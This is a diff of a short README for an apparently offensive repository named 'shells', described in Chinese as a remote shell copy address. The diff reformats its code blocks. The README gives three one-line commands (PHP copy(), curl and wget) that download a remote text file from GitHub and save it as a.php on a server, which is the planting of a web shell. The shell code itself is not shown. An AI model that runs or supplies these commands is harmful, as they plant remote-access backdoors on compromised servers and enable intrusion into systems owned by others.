@@ -1,10 +1,11 @@
 # shells
 > 用于作为远程shell copy地址
-* php
-```text
+```php
 copy("https://raw.githubusercontent.com/LTLTLXEY/shells/main/a.txt",a.php);
 ```
-* curl
+```shell
 curl https://raw.githubusercontent.com/LTLTLXEY/shells/main/a.txt -o a.php
-* wget
+```
+```shell
 wget https://raw.githubusercontent.com/LTLTLXEY/shells/main/a.txt -O a.php
+```
